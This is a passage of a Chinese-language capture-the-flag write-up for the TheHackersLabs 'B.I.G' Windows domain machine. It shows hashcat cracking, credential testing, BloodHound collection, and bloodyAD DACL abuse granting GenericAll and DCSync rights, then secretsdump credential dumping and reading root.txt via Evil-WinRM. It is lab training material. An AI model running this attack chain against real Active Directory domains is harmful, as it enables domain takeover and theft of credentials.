\u003ccode\u003ehashcat\u003c/code\u003e 破解，使用上面的的字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG hashcat -m 18200 \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e Skyisthelimit.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003ePasswordsave@\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\song:Passwordsave@ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e寻找利用链，重新获取一下数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'bbr.thl'\u003c/span\u003e -ns 192.168.212.4 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'BIG.bbr.thl'\u003c/span\u003e -u song -p Passwordsave@\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e链子 1 ❌\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将 \u003ccode\u003eSong\u003c/code\u003e 添加 \u003ccode\u003eSPECIAL PERMISSIONS\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e = ConvertTo-SecureString \u003cspan class=\"hljs-string\"\u003e'Passwordsave@'\u003c/span\u003e -AsPlainText -Force\n\u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e = New-Object System.Management.Automation.PSCredential(\u003cspan class=\"hljs-string\"\u003e'bbr\\song'\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$SecPassword\u003c/span\u003e)\nAdd-DomainGroupMember -Identity \u003cspan class=\"hljs-string\"\u003e'SPECIAL PERMISSIONS'\u003c/span\u003e -Members \u003cspan class=\"hljs-string\"\u003e'song'\u003c/span\u003e -Credential \u003cspan class=\"hljs-variable\"\u003e$Cred\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDACL\u003c/code\u003e 滥用，赋予自己拥有\u003ccode\u003eusers\u003c/code\u003e的所有权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'bbr.thl'\u003c/span\u003e -u song -p \u003cspan class=\"hljs-string\"\u003e'Passwordsave@'\u003c/span\u003e --dc-ip 192.168.212.4 add genericAll \u003cspan class=\"hljs-string\"\u003e'CN=USERS,DC=BBR,DC=THL'\u003c/span\u003e song\n[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改\u003ccode\u003eadministrator\u003c/code\u003e密码，失败，因为\u003ccode\u003eadministrator\u003c/code\u003e 是保护用户，不能直接修改密码\u003c/p\u003e\n\u003ch3\u003e链子 2\u003c/h3\u003e\n\u003cp\u003e我们直接控制域\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'bbr.thl'\u003c/span\u003e -u song -p \u003cspan class=\"hljs-string\"\u003e'Passwordsave@'\u003c/span\u003e --dc-ip 192.168.212.4 add genericAll \u003cspan class=\"hljs-string\"\u003e'DC=BBR,DC=THL'\u003c/span\u003e song                             \n[+] song has now GenericAll on DC=BBR,DC=THL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再添加一个\u003ccode\u003eDcsync\u003c/code\u003e权限给自己\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  BIG bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'bbr.thl'\u003c/span\u003e -u song -p \u003cspan class=\"hljs-string\"\u003e'Passwordsave@'\u003c/span\u003e --dc-ip 192.168.212.4 add dcsync song\n[+] song is now able to DCSync\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eDcsync\u003c/code\u003e，使用 \u003ccode\u003esecretsdump\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esecretsdump.py bbr.thl/song:\u003cspan class=\"hljs-string\"\u003e'Passwordsave@'\u003c/span\u003e@192.168.212.4 -dc-ip 192.168.212.4\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsB%20I%20G/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt\n8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e难点在\u003ccode\u003eWeb\u003c/code\u003e上，一时半会写不出来\u003c/p\u003e\n\u003cp\u003e但是拿到\u003ccode\u003euser\u003c/code\u003e后就很简单了，一把梭哈\u003c/p\u003e","title":"TheHackersLabs - B.I.G","date":"2025-07-18","updated":"2025-07-18","tags":["TheHackersLabs","Windows","Domain","AD","MISC","AS_REPRoat"],"categories":"靶机","comments":true,"description":"B.I.G\n\n https://labs.thehackerslabs.com/machine/6\n \n\n\n\nRecon\n\nPort scan\n\n使用 `nmap` 对端口进行扫描\n\n\n\n\n\n枚举测试\n\n`SMB` 匿名账户测试\n\n\n\nWEB\n\n目录扫描\n\n`HTTP` 服务\n\n\n\n 两段歌词的来源\n \n \n I keep it music music, I eat that lunch (Yea..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsB I G"},"buildId":"_7ZRK1_b_3nw7F46XEgn9","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>